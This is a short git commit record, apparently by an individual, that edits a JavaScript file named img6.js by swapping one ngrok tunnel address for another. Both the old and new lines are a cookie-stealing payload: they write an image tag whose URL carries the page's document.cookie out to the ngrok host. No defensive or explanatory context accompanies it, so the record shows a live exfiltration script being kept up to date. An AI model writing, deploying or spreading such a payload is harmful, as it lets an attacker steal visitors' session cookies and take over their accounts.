9bb32fd917fba617fad62806067e5609ea35ab78
David Brosnan <dbrosn626@gmail.com>
2023-02-07 01:36:02 -0500

    Update img6.js

--- img6.js
+++ img6.js
@@ -1,1 +1,1 @@
-document.write('<img src="https://9f9e-108-6-112-24.ngrok.io/123.html?c='+encodeURIComponent(document.cookie)+'&x=end" />');
+document.write('<img src="https://e4ff-108-6-112-24.ngrok.io/123.html?c='+encodeURIComponent(document.cookie)+'&x=end" />');
